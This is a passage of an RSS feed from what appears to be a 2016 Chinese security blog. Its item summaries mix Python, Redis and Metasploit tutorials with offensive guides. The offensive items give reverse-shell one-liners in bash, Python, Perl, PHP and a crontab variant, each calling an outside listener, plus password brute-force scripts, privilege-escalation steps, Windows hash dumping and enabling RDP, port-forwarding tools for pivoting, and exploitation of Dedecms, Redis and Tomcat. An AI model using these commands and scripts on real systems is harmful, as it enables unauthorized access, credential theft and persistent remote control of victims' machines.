      <description>接收变量的php脚本如下  //代码仅供测试 &amp;lt;?php $name = @$_POST[&#39;uname&#39;]; $pass = @$_POST[&#39;upass&#39;]; if (empty($name) or empty($pass)){ header(&amp;quot;location:http://127.0.0.1:921/test/test/index.html&amp;quot;); exit(); } else { if ($name === &#39;admin&#39; and $pass === &#39;123456&#39;){ header(&amp;quot;location:http://127.0.0.1:921/test/test/sucess.html&amp;quot;); } else { header(&amp;quot;location:http://127.0.0.1:921/test/test/error.html&amp;quot;); exit(); } } ?&amp;gt;   爆破表单的python脚本如下  #!/usr/bin/env python # -*- coding: utf-8 -*- import hashlib import requests from Queue import Queue import threading from optparse import OptionParser from time import sleep lock = threading.Lock() queue = Queue() result = [] class FormBlast(threading.</description>
    </item>
    
    <item>
      <title>Sublime Text 3几个好用的插件</title>
      <link>http://wyb0.com/posts/sublime-text3-plugins/</link>
      <pubDate>Fri, 02 Sep 2016 23:07:44 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/sublime-text3-plugins/</guid>
      <description>0x00 Package Control  安装完这个插件后可以更容易的管理(安装、删除、查看等)其他插件
  代码安装
ctrl+~快捷键调出console，将下面代码粘贴进去，然后Enter执行(注意单引号)   import urllib.request,os; pf = &#39;Package Control.sublime-package&#39;; ipp = sublime.installed_packages_path(); urllib.request.install_opener( urllib.request.build_opener( urllib.request.ProxyHandler()) ); open(os.path.join(ipp, pf), &#39;wb&#39;).write(urllib.request.urlopen( &#39;http://sublime.wbond.net/&#39; + pf.replace(&#39; &#39;,&#39;%20&#39;)).read())    手动安装
 点击https://sublime.wbond.net/Package%20Control.sublime-package 下载文件 将下载的文件放在root path/Data/Installed Packages下 重启Sublime Text  使用方法  Ctrl+Shift+P调出菜单然后选择相应操作  Preferences -&amp;gt; Package Control也可调出  选择Install Package后可以输入想安装的插件名搜索安装    0x01 Emmet  前端必备插件，前身是Zen Coding，可高效编写HTML和CSS(需要依赖PyV8，会自动安装) 
 0x02 Anaconda  可以自动补全并提示语法，还可跳转到定义、使用等 效果如下：  0x03 Git  在编辑器就可以执行git命令，有github的开发者必备  0x04 GitGutter  在有了Git插件后，GitGutter 更好的帮助开发者查看文件之前的改动和差异，提升开发效率  0x05 Markdown Preview  可以在本地预览文件  0x06 DocBlokr  这个插件对于编码风格很严的编程语言很有帮助，可以生成标准的注释  0x07 AutoFileName  快捷输入文件名  0x08 Theme-Flatland和Theme-SoDaReloaded  两个主题插件，安装好之后：首选项 -&amp;gt; 设置-用户，修改文件Packages/User/Preferences.</description>
    </item>
    
    <item>
      <title>PHP安全配置</title>
      <link>http://wyb0.com/posts/php-safe-configuration/</link>
      <pubDate>Thu, 01 Sep 2016 08:46:03 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/php-safe-configuration/</guid>
      <description> 0x00 PHP的配置  PHP的配置文件为php.ini,其中有些项配置不当的话就会造成一些安全问题
 0x01 远程文件包含  涉及配置项  allow_url_include  配置为On时允许进行远程文件包含  allow_url_fopen  配置为On时允许使用函数fopen、file_put_contents   配置方案  alllow_url_include = Off allow_url_fopen = Off   0x02 关闭错误回显  涉及配置项  display_errors  配置为On时会显示错误信息   配置方案  display_errors = Off log_errors = On error_log = /var/log/php_error.log   0x03 隐藏php版本  涉及配置项  expose_php  为Off时会隐藏php版本   配置方案  expose_php = Off   0x04 魔术引号  涉及配置项  magic_quotes_gpc  过滤get、post、cookie的单引号、双引号、反斜杠、空字符，但不过滤$_SERVER  magic_quotes_runtime  对文件或数据库中取出的数据进行过滤，可防止二次注入   配置方案  做逻辑判断时需要去掉反斜杠，所以用全局过滤框架做过滤吧   0x05 安全模式  涉及配置项  safe_mode  开启后安全系数提升，但会限制函数使用权限和操作目录文件权限等   配置方案  在安全模式下可以使用safe_mode_include_dir = /var/www/common来排除某些文件   0x06 目录权限控制  涉及配置项  open_basedir  开启后可将用户访问范围限定，可防止跨站，但会影响性能   配置方案  open_basedir = /var/www/web1/:/var/www/web2/ (后面的斜杠不能少)   0x07 禁止函数  涉及配置项  disable_functions  禁止某些命令执行函数和文件操作函数的使用   配置方案  disable_functions = system,passthru,exec,shell_exec,popen,pcntl_exec, proc_open,chdir,chroot,getcwd,readdir,mkdir,copy,file_get_contents,   0x08 注册全局变量  涉及配置项  register_globals  值为On是会开启全局注册变量功能   配置方案  register_globals = Off   </description>
    </item>
    
    <item>
      <title>Python的模块</title>
      <link>http://wyb0.com/posts/python-module/</link>
      <pubDate>Wed, 31 Aug 2016 11:22:41 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/python-module/</guid>
      <description>0x00 Python的模块  在python中，任何一个python文件都可以看作一个模块 不同包下有相同模块名并不会冲突，且包下必须有文件__init__.py from lib import * 意思是从包lib中导入所有模块(若lib为模块名则为导入模块的所有函数) from lib.module1 import test 意思是从lib这个包下的module1模块中导入函数test import导入模块时会从sys.path输出的结果路径中查找模块然后导入 sys.path.append(&amp;rsquo;D:/xx/xx/xx/code&amp;rsquo;)可以添加搜索路径 使用if __name__ == &amp;lsquo;__main__&amp;lsquo;:  0x01 实例  文件结构如下  测试文件test.py
   #!/usr/bin/env python # -*- coding: utf-8 -*- from package1 import * #导入包package1下的所有模块 import package2.module3 #导入包package2下的module3模块 import package2.module4 as s #导入包package2下的module4模块并重命名为s a = module1.Class1() #创建一个对象 a.test() #调用类中的方法 b = module2.Class2() b.test() c = package2.module3.Class3() c.test() d = s.Class4() d.</description>
    </item>
    
    <item>
      <title>Python实现密码生成器</title>
      <link>http://wyb0.com/posts/python-password-generator/</link>
      <pubDate>Mon, 29 Aug 2016 15:14:57 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/python-password-generator/</guid>
      <description>简介  有时候需要在网上注册许多账号，如果每个账户密码都一样的话，若被别人得知一个密码则所有账户就都沦陷了，若密码不一样则可能会忘记，在这里就用脚本写一个生成密码的工具，只需输入域名和账户名就可以根据key生成不一样的密码，也可以把域名和账户名写入文件，这样你用户名也可以不用记了。。。
 代码如下  #!/usr/bin/env python # -*- coding: utf-8 -*- import hashlib import sys import os import optparse import json import msvcrt def get_md5(string): md5 = hashlib.md5() md5.update(string) s = md5.hexdigest() return s def get_domain(): if os.path.exists(&#39;account.txt&#39;): data = {} with open(&#39;account.txt&#39;, &#39;r&#39;) as f: lines = f.readlines() for line in lines: line = line.split(&#39;*&#39;) data[line[0]] = line[1].strip() else: pass return data def get_pass(): pwd = [] while True: nchar = msvcrt.</description>
    </item>
    
    <item>
      <title>Python实现多线程弱口令爆破</title>
      <link>http://wyb0.com/posts/python-multi-threaded-weak-password-blasting/</link>
      <pubDate>Fri, 26 Aug 2016 17:53:51 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/python-multi-threaded-weak-password-blasting/</guid>
      <description>脚本  #!/usr/bin/env python # -*- coding: utf-8 -*- &#39;this script can bruter ftp/ssh/mysql&#39; __author__ = &#39;reber&#39; import Queue import threading import time import logging import socket from optparse import OptionParser import paramiko from ftplib import FTP import MySQLdb #################公有类################# class CommonFun(object): &amp;quot;&amp;quot;&amp;quot;docstring for CommonFun&amp;quot;&amp;quot;&amp;quot; def __init__(self): super(CommonFun, self).__init__() def set_log(self,lname): logger = logging.getLogger(lname) logger.setLevel(logging.DEBUG) ch = logging.StreamHandler() ch.setLevel(logging.DEBUG) formatter = logging.Formatter(&#39;%(asctime)s - %(name)s - %(levelname)s - %(message)s&#39;) ch.setFormatter(formatter) logger.</description>
    </item>
    
    <item>
      <title>Python的异常处理</title>
      <link>http://wyb0.com/posts/python-exception-handling/</link>
      <pubDate>Fri, 26 Aug 2016 10:40:44 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/python-exception-handling/</guid>
      <description> 0x00 Python异常处理  #!/usr/bin/env python # -*- coding: utf-8 -*- try: try: # 可嵌套 str(&amp;quot;aaaaa&amp;quot;) # int(&amp;quot;aaaaa&amp;quot;) # print a # print 1/0 except (TypeError, IndexError, ValueError): #捕获多种异常 print &amp;quot;TypeErrorZero or DivisionError or ValueError&amp;quot; except ZeroDivisionError as aa: #捕获除零错误 print aa #输出详细错误信息 except: print u&amp;quot;发生其他异常则执行这里&amp;quot; else: print u&amp;quot;上面没有出错才输出这里&amp;quot; a = [1,2,3] print a[4] #这里出错，会向上抛出错误，最终输出this is error finally: print u&amp;quot;不管是否出错都输出这里，一般用于释放资源，如关闭文件&amp;quot; except Exception as e: #可捕获所有异常类型 print &amp;quot;this is error&amp;quot; print e   </description>
    </item>
    
    <item>
      <title>Metasploit的简单使用</title>
      <link>http://wyb0.com/posts/metasploit-usage/</link>
      <pubDate>Tue, 23 Aug 2016 10:05:52 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/metasploit-usage/</guid>
      <description> 0x00 启动   0x01 Metasploit的工作平台  在msf里的工作平台可以保存历史的一些操作信息  0x02 使用db_nmap扫描主机  扫描后的结果会保留在工作平台中，可以用hosts和services进行查看：  0x03 使用msf的模块进行弱口令爆破  注：这里针对ftp服务进行弱口令测试 使用vulns可以查看结果：msf auxiliary(ftp_login) &amp;gt; vulns  </description>
    </item>
    
    <item>
      <title>Python的一些小模块</title>
      <link>http://wyb0.com/posts/python-some-small-modules/</link>
      <pubDate>Fri, 19 Aug 2016 19:42:14 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/python-some-small-modules/</guid>
      <description>0x00 colorama  这个模块可以输出带有颜色的字符
#!/usr/bin/env python # -*- coding: utf-8 -*- import colorama colorama.init() print &amp;quot;{f_color}{content}{g_color}&amp;quot;.format(f_color=colorama.Fore.CYAN,content=&#39;debug&#39;,g_color=colorama.Fore.RESET) print &amp;quot;{f_color}{content}{g_color}&amp;quot;.format(f_color=colorama.Fore.YELLOW,content=&#39;warning&#39;,g_color=colorama.Fore.RESET) print &amp;quot;{f_color}{content}{g_color}&amp;quot;.format(f_color=colorama.Fore.RED,content=&#39;error&#39;,g_color=colorama.Fore.RESET)   0x01 pyfiglet  可以输出字体的图片效果
from pyfiglet import figlet_format print figlet_format(&amp;quot;reber&amp;quot;, font=&amp;quot;xtty&amp;quot;) #font可以控制输出的类型   0x02 chardet  这个模块可以用来判断你的字符串(除了Unicode类型)是什么类型的编码
#!/usr/bin/env python #-*- coding:utf-8 -*- import chardet import requests resp = requests.get(&amp;quot;https://tower.im/users/sign_in&amp;quot;) html = resp.content if not isinstance(html,unicode): code = chardet.detect(html) print code #输出当前的编码方式 #解码为unicode，然后编码为gbk str1 = html.</description>
    </item>
    
    <item>
      <title>Ubuntu下安装Metasploit</title>
      <link>http://wyb0.com/posts/ubuntu-install-metasploit/</link>
      <pubDate>Thu, 18 Aug 2016 10:38:41 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/ubuntu-install-metasploit/</guid>
      <description> 0x00 安装Metasploit  下载msfinstall脚本
$ curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &amp;gt; msfinstall  修改文件权限
$ chmod 755 msfinstall  安装(时间较久)
$ ./msfinstall  更新exp
$ msfupdate   0x01 连接数据库  首先启动postgresql数据库
$ /etc/init.d/postgresql start #service postgresql start也可以  初始化MSF数据库(关键步骤)
$ msfdb init  运行msfconsole
$ msfconsole  在msf中查看数据库连接状态
msf &amp;gt; db_status #若出现错误：Module database cache not built yet, using slow search #则重新构建缓存，缓存构建通常需要5-10分钟左右。 #构建完成后，退出Metasploit控制台，然后重新进入即可使用数据库缓存进行搜索模块 msf &amp;gt; db_rebuild_cache   </description>
    </item>
    
    <item>
      <title>Python的optparse模块</title>
      <link>http://wyb0.com/posts/python-module-optparse/</link>
      <pubDate>Tue, 16 Aug 2016 15:10:44 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/python-module-optparse/</guid>
      <description> 0x00 关于optparse模块  python2.3之后添加的模块optparse是专门用来处理命令行选项的
import optparse parser = optparse.OptionParser(usage=&#39;Usage: %prog [options] domaion&#39;, version=&#39;%prog 1.2&#39;) parser.add_option(&#39;-b&#39;, &#39;--bug&#39;, dest=&#39;isbug&#39;, default=False, action=&#39;store_true&#39;, help=&#39;Whether open the debug mode, default is false&#39;) parser.add_option(&#39;-u&#39;, &#39;--url&#39;, dest=&#39;url&#39;, default=None, action=&#39;store&#39;, type=&#39;string&#39;, help=&#39;target url&#39;) parser.add_option(&#39;-n&#39;,&#39;--number&#39;, dest=&#39;num&#39;, default=10, type=&#39;int&#39;, help=&#39;the number, default is 10&#39;) (options, args) = parser.parse_args() print options print args print options.url # parser.print_help() # show help message   0x01 说明  在输出帮助信息时%prog会被脚本名代替 -b和--bug作用一样，一个是短标签一个是长标签 dest：它是存储变量值的变量名 default：默认的值 type：值的类型，默认为string，可以不用写 action：有3种类型 默认action=&#39;store&#39;，可以不用写 action=&#39;store_true&#39;使用参数时将布尔值true存储到dest指定的变量中 action=&#39;store_false&#39;使用参数时将布尔值false存储到dest指定的变量中   </description>
    </item>
    
    <item>
      <title>BurpSuite抓手机包</title>
      <link>http://wyb0.com/posts/burpsuite-intercept-packets-of-phone/</link>
      <pubDate>Sat, 13 Aug 2016 23:53:39 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/burpsuite-intercept-packets-of-phone/</guid>
      <description> 0x00 环境设置  Windows Phone手机和电脑处于同一无线环境下：  0x01 BurpSuite设置   0x02 抓HTTP包   0x03 抓HTTPS包  挂burpsuite的代理下载证书  把证书上传到你自己的服务器上(也可以本地搭建网站)，然后手机访问证书
安卓手机修改证书后缀为crt，证书可以放在网站上，也可以直接拖到手机上，然后安装  抓https数据包   </description>
    </item>
    
    <item>
      <title>Linux下虚拟主机搭建多站点</title>
      <link>http://wyb0.com/posts/linux-virtual-host-build-multi-site/</link>
      <pubDate>Fri, 12 Aug 2016 08:39:35 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/linux-virtual-host-build-multi-site/</guid>
      <description>环境：CentOS-6.5-x86_64-minimal
0x00 搭建LAMP  安装Apache
yum install httpd  安装MySQL
 yum install mysql mysql-server 设置数据库
[reber@localhost conf]$ sudo mysql_secure_installation # 更新root密码： [reber@localhost conf]$ mysql -uroot –p mysql&amp;gt; use mysql; mysql&amp;gt; update user set password=password(&#39;123456&#39;) where user=&#39;root&#39;; mysql&amp;gt; flush privileges; //不想重启mysql就使新密码生效就需要运行此命令刷新 mysql&amp;gt; insert into mysql.user(Host,User,Password) values(&amp;quot;localhost&amp;quot;,&amp;quot;blog&amp;quot;,password(&amp;quot;123456&amp;quot;)); # mysql&amp;gt; detele form mysql.user where User=&#39;blog&#39; and Host=&#39;localhost&#39;; //这步可以删除用户 mysql&amp;gt; flush privileges; //刷新 mysql&amp;gt; create database db_blog; Query OK, 1 row affected (0.</description>
    </item>
    
    <item>
      <title>Python的scapy模块简单使用</title>
      <link>http://wyb0.com/posts/python-module-scapy/</link>
      <pubDate>Thu, 11 Aug 2016 23:26:39 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/python-module-scapy/</guid>
      <description> 0x00 简单尝试   0x01 生成一组数据包   0x02 发送数据包  send发送数据包  sr1发送数据包  sr发送数据包   0x03 发送SYN数据包   0x04 得到TCP内容   0x05 SYN Scans   </description>
    </item>
    
    <item>
      <title>Web常见漏洞脑图</title>
      <link>http://wyb0.com/posts/mind-map-of-web-common-vulnerabilities/</link>
      <pubDate>Thu, 11 Aug 2016 21:17:21 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/mind-map-of-web-common-vulnerabilities/</guid>
      <description> Web常见漏洞 </description>
    </item>
    
    <item>
      <title>Linux下SSH连接</title>
      <link>http://wyb0.com/posts/linux-ssh-connect/</link>
      <pubDate>Wed, 10 Aug 2016 11:46:13 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/linux-ssh-connect/</guid>
      <description> 0x00 SSH相关选项  -V 显示版本 -f 输入密码后进入后台模式 -N 不执行远程命令，用于端口转发 -D socket5代理 -L tcp转发 -C 使用数据压缩，网速快时会影响速度   0x01 SSH免密码登陆  A主机免密码登陆B主机：
A主机运行： ssh-keygen -t rsa 会生成两个文件~/.ssh/id_rsa和~/.ssh/id_rsa.pub 将id_rsa.pub中的内容复制到B主机的~/.ssh/authorized_keys中 注： 要确保B主机~/.ssh/authorized_keys权限为600 要确保B主机~/.ssh/文件夹权限为700 要确保上述两个文件属主是当前用户   0x02 SSH反向连接  主机A要通过SSH连接主机B：
B上先运行： ssh -NfR 8888:localhost:22 reber@A-IP 输入主机A的用户reber的密码后即可在A主机监听一个8888端口，它与主机B的22端口绑定  A主机运行： ssh root@127.0.0.1 -p 8888 输入本机的root的密码即可登入主机B的root用户   0x03 SSH Socks5代理   </description>
    </item>
    
    <item>
      <title>Linux下系统漏洞提权</title>
      <link>http://wyb0.com/posts/linux-use-system-vulnerabilities-elevate-privileges/</link>
      <pubDate>Tue, 09 Aug 2016 19:23:13 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/linux-use-system-vulnerabilities-elevate-privileges/</guid>
      <description>0x00 Linux下的提权  Linux下一般都是系统漏洞提权，分为以下几个步骤：
1. 获取系统版本号 2. 根据系统版本号找对应exp 3. 反弹shell 4. 尝试利用   0x01 提权  获取系统版本号  获取发行版本  cat /etc/*-release cat /etc/issue cat /etc/lsb-release cat /etc/redhat-release  获取内核版本  cat /proc/version uname -a uname -mrs rpm -q kernel dmesg | grep Linux ls /boot | grep vmlinuz   根据系统版本号找对应exp  http://www.exploit-db.com http://1337day.com http://www.securiteam.com http://www.securityfocus.com http://www.exploitsearch.net http://metasploit.com/modules http://securityreason.com http://seclists.org/fulldisclosure http://www.google.com  反弹shell  本地：nc -l -p 8888 目标机器：/bin/bash -i &amp;gt;&amp;amp; /dev/tcp/10.</description>
    </item>
    
    <item>
      <title>端口转发</title>
      <link>http://wyb0.com/posts/port-forwarding/</link>
      <pubDate>Mon, 08 Aug 2016 19:33:45 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/port-forwarding/</guid>
      <description>0x00 应用场景  内网IP的80端口通过端口映射到了外网IP的80端口上 内网的Web服务器通过外网IP反向代理(如Nginx) 也就是说Web服务器在内网中  0x01 判断Web是否为内网  向ping域名，查看IP是外网 用webshell查看ip却是内网IP  0x02 端口转发工具  lcx htran EarthWorm netsh reGeorg meterpreter porfwd  0x03 lcx端口转发  Hacker：lcx.exe -listen 500 8888 Victim：lcx.exe -slave hacker_ip 500 victim_ip 3389 Hacker：cmd mstsc hacker_ip:500   0x04 EarchWorm端口转发  Hacker：./ew -s rcsocks -l 1080 -e 8888 Victim：./ew -s rssocks -d hacker_ip -e 8888 1. 启动EarchWorm 2.</description>
    </item>
    
    <item>
      <title>导出主机密码与开启3389</title>
      <link>http://wyb0.com/posts/export-host-password-and-open-3389/</link>
      <pubDate>Mon, 08 Aug 2016 08:28:27 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/export-host-password-and-open-3389/</guid>
      <description>0x00 导出主机密码hash  条件  administrator以上权限  工具  wce gethash hashdump  hash解密网站
 http://www.objectif-securite.ch/ophcrack.php  上传工具得到hash   0x01 导出主机密码  条件  administrator以上权限 当前管理员没有注销登陆(可以通过query user命令看出)  工具  mimikatz getpass  上传工具得到密码   0x02 开启3389  直接使用注册表  写一个批处理也行
# 3389.bat内容如下： echo Windows Registry Editor Version 5.00&amp;gt;&amp;gt;3389.reg echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server]&amp;gt;&amp;gt;3389.reg echo &amp;quot;fDenyTSConnections&amp;quot;=dword:00000000&amp;gt;&amp;gt;3389.reg echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp]&amp;gt;&amp;gt;3389.</description>
    </item>
    
    <item>
      <title>Windows下第三方服务提权</title>
      <link>http://wyb0.com/posts/windows-use-third-party-server-elevate-privileges/</link>
      <pubDate>Sun, 07 Aug 2016 23:38:58 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/windows-use-third-party-server-elevate-privileges/</guid>
      <description>MSSQL和MySQL提权
MSSQL提权  MSSQL运行在system权限时才可以通过xp_cmdshell组件执行系统命令提权
提权条件：数据库账号是DBA权限
 关于xp_cmdshell  得到数据库连接信息，连接数据库后执行EXEC xp_cmdshell &amp;lsquo;net user&amp;rsquo;; 有sql注入时也可以直接在url上使用xp_cmdshell，因为mssql可以多语句执行，例如?id=1;EXEC xp_cmdshell &amp;lsquo;net user&amp;rsquo;;--  连接数据库   执行系统命令   添加用户   远程连接   
MySQL提权  环境：web应用服务器权限较低
提权条件：MySQL是system权限
 关于UDF  MySQL提权可以用UDF和Mof。UDF就是User defined Function，即用户定义函数，可以通过创建存储方法来定义函数，从而调用系统命令。
 UDF提权过程  导入udf.dll到服务器指定目录
 MySQL版本小于5.1的udf.dll要导入到c:\windows\目录下
 MySQL版本大于等于5.1的udf.dll要导入到plugin_dir目录，plugin_dir在MySQL安装目录下的lib/plugin目录下(MySQL安装目录可以用select @@basedir得到)，默认不存在这个目录，我们要自己创建  使用SQL语句创建功能函数
CREATE FUNCTION shell RETURNS STRING SONAME &amp;lsquo;udf.</description>
    </item>
    
    <item>
      <title>Windows下系统漏洞提权</title>
      <link>http://wyb0.com/posts/windows-use-system-vulnerabilities-elevate-privileges/</link>
      <pubDate>Sun, 07 Aug 2016 21:31:35 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/windows-use-system-vulnerabilities-elevate-privileges/</guid>
      <description> 提权是在已经getshell但是权限不大的前提下做的
0x00 查看基本信息   0x01 使用cmd执行命令  尝试使用cmd执行命令  找可写目录  尝试上传cmd.exe  写一个aspx马  上传cmd.exe  再次尝试使用cmd执行命令   0x02 权限提升  查看未安装补丁  上传exp提权   0x03 添加用户  添加远程连接用户   0x04 使用3389远程连接   </description>
    </item>
    
    <item>
      <title>Linux下反弹shell</title>
      <link>http://wyb0.com/posts/linux-bounce-shell/</link>
      <pubDate>Sat, 06 Aug 2016 08:36:53 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/linux-bounce-shell/</guid>
      <description>当你找到一个有命令执行的主机时，你可能想要一个交互式deshell，如果你不能添加用户或者添加ssh密钥时，你就需要反弹一个shell来实现，下面的都是反弹shell的命令
0x00 Bash /bin/bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.10.10/8888 0&amp;gt;&amp;amp;1 注：这个由解析shell的bash完成，有些时候不支持  0x01 crontab 下面这条命令执行后会每隔30分钟反弹一次： (crontab -l;printf &amp;quot;*/30 * * * * exec 9&amp;lt;&amp;gt; /dev/tcp/10.10.10.10/8888;exec 0&amp;lt;&amp;amp;9; exec 1&amp;gt;&amp;amp;9 2&amp;gt;&amp;amp;1;/bin/bash --noprofile -i;\rno crontab for `whoami`%100c\n&amp;quot;)| crontab -  0x02 Python # 下面为1条命令 python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET, socket.SOCK_STREAM);s.connect((&amp;quot;10.10.10.10&amp;quot;,8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&amp;quot;/bin/sh&amp;quot;,&amp;quot;-i&amp;quot;]);&#39;  0x03 Perl # 下面为1条命令 perl -e &#39;use Socket;$i=&amp;quot;10.10.10.10&amp;quot;;$p=8888;socket(S,PF_INET,SOCK_STREAM, getprotobyname(&amp;quot;tcp&amp;quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN, &amp;quot;&amp;gt;&amp;amp;S&amp;quot;);open(STDOUT,&amp;quot;&amp;gt;&amp;amp;S&amp;quot;);open(STDERR,&amp;quot;&amp;gt;&amp;amp;S&amp;quot;);exec(&amp;quot;/bin/sh -i&amp;quot;);};&#39;  0x04 PHP php -r &#39;$sock=fsockopen(&amp;quot;10.10.10.10&amp;quot;,8888);exec(&amp;quot;/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3&amp;quot;);&#39;  0x05 Ruby # 下面为1条命令 ruby -rsocket -e&#39;f=TCPSocket.</description>
    </item>
    
    <item>
      <title>Dedecms远程写文件漏洞</title>
      <link>http://wyb0.com/posts/dedecms-remote-write-file-vulnerability/</link>
      <pubDate>Fri, 05 Aug 2016 23:29:20 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/dedecms-remote-write-file-vulnerability/</guid>
      <description> 0x00 关于漏洞  Dedecms在20150618之前的版本都存在远程写文件漏洞，主要起因是Apache的解析漏洞   0x01 利用条件  dedecms版本为20150618之前的 安装目录install下的index.php.bak文件未被删除   0x02 实例  查看cms版本  清空文件
   http://www.xxxx.com/install/index.php.bak?step=11&amp;amp;insLockfile=a &amp;amp;s_lang=a&amp;amp;install_demo_name=../data/admin/config_update.php 访问上面的链接会使服务器到http://updatenew.dedecms.com/base-v57/dedecms/ demodata.a.txt中读取内容写入到config_update.php，但demodata.a.txt为空， 所以就清空了config_update.php    在自己的服务器上创建文件  写入文件
   访问http://www.xxxx.com/install/index.php.bak?step=11&amp;amp;insLockfile=a &amp;amp;s_lang=a&amp;amp;install_demo_name=info.php&amp;amp;updateHost=http://123.123.123.123/ 将自己的网站的dedecoms/demodata.a.txt写入到目标站点的install/下的info.php中    访问生成的文件   </description>
    </item>
    
    <item>
      <title>Redis未授权访问漏洞</title>
      <link>http://wyb0.com/posts/redis-unauthorized-access/</link>
      <pubDate>Thu, 04 Aug 2016 15:52:26 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/redis-unauthorized-access/</guid>
      <description> 0x00 Redis的未授权访问  若Redis服务器对公网开放，且未启用认证，则攻击者可以未授权访问服务器。 若Redis以root身份运行，黑客可以给root账户写入SSH公钥文件，通过SSH登录受害服务器。   0x01 向Redis服务器上传SSH公钥   0x02 通过计划任务反弹shell   </description>
    </item>
    
    <item>
      <title>Redis的使用</title>
      <link>http://wyb0.com/posts/redis-bisis-use/</link>
      <pubDate>Wed, 03 Aug 2016 11:02:20 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/redis-bisis-use/</guid>
      <description>0x00 连接Redis  # 客户端连接 $ redis-cli # 连接远程redis $ redis-cli -h host -p port -a password # 查看所有键值 127.0.0.1:6379&amp;gt; keys * # 选择数据库 127.0.0.1:6379&amp;gt; select 0 #可以选择0～15 # 获取redis安装目录 127.0.0.1:6379&amp;gt; config get dir 1) &amp;quot;dir&amp;quot; 2) &amp;quot;/var/lib/redis&amp;quot; # 备份(恢复数据时只需要将备份文件放在redis安装目录即可) 127.0.0.1:6379&amp;gt; save OK 127.0.0.1:6379&amp;gt; exit   0x01 数据类型  String(字符串)  string是redis最基本的类型，你可以理解成与Memcached一模一样的类型，一个key对应一个value。 string类型是二进制安全的。意思是redis的string可以包含任何数据。比如jpg图片或者序列化的对象 。 string类型是Redis最基本的数据类型，一个键最大能存储512MB。  Hash(哈希)  Redis hash 是一个键名对集合。 Redis hash是一个string类型的field和value的映射表，hash特别适合用于存储对象。  List(列表)  Redis 列表是简单的字符串列表，按照插入顺序排序。 可以添加一个元素到列表的头部（左边）或者尾部（右边）。  Set(集合)  Redis的Set是string类型的无序集合。 集合内元素是唯一的，后者会覆盖前者。 集合是通过哈希表实现的，所以添加，删除，查找的复杂度都是O(1)。  zset(有序集合)  Redis zset 和 set 一样也是string类型元素的集合,且不允许重复的成员。 zset每个元素都会关联一个double类型的分数。redis正是通过分数来为集合中的成员进行从小到大的排序。 zset的成员是唯一的,但分数(score)却可以重复。   0x02 String  # 添加键值对 127.</description>
    </item>
    
    <item>
      <title>Redis的安装</title>
      <link>http://wyb0.com/posts/redis-install/</link>
      <pubDate>Wed, 03 Aug 2016 00:00:48 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/redis-install/</guid>
      <description>0x00 关于Redis  Redis和MySQL这种关系型数据库不一样，它是非关系型数据库，是日志型、Key-Value数据库， 实现了master-slave(主从)同步,数据都是缓存在内存中的,所以可高速读写,但存储成本较高, 不适合做海量数据存储。   0x01 安装  可在http://download.redis.io/releases/ 下载
$ cd /opt $ wget http://download.redis.io/releases/redis-3.2.3.tar.gz $ tar -zxvf redis-3.2.3.tar.gz $ cd redis-3.2.3 $ make $ make install   0x02 产生的可执行文件  redis-server：redis服务器启动程序 redis-cli：redis命令行工具，也可为客户端 redis-stat：redis状态检测工具 redis-benchmark：redis性能检测工具(读写)   0x03 配置文件  $ vim /opt/redis-3.2.3/redis.conf daemonize yes # 当值为yes时可以后台运行 bind 127.0.0.1 # 绑定ip，配置后只接受来自该ip的请求 port 6379 # 监听端口 timeout 300 # 客户端连接超时时间，单位为秒 loglevel notice # 日志等级分为4级，debug、verbose、notice、warning logfile &amp;quot;/var/log/redis.</description>
    </item>
    
    <item>
      <title>Tomcat部署War包getshell</title>
      <link>http://wyb0.com/posts/tomcat-deploy-war-package-to-getshell/</link>
      <pubDate>Tue, 02 Aug 2016 22:30:13 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/tomcat-deploy-war-package-to-getshell/</guid>
      <description>0x00 关于War包  War包一般是进行Web开发时一个网站Project下的所有代码,包括前台HTML/CSS/JS代码, 以及Java的代码。当开发人员开发完毕时,就会将源码打包给测试人员测试,测试完后若要发布 则也会打包成War包进行发布。War包可以放在Tomcat下的webapps或word目录,当Tomcat 服务器启动时,War包也会随之被解压后自动部署。   0x01 上传War包GetShell  找到后台猜密码然后登录  上传War包
